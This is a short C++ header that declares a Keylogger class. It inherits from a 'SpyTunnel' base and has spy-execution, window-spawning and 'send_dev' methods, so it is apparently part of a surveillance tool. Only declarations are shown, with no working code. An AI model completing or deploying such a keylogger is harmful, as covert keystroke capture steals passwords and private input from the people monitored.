#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include "include_tunnel.hpp"
#include "spy_tunnel.hpp"

class Keylogger : public SpyTunnel {
public:
    Keylogger() = default;
    void set_layout(const std::string& __layout);
protected:
    std::string layout_;

    void exec_spy() override;
    void spawn_window() override;
    void send_dev();
};

#endif // KEYLOGGER_HPP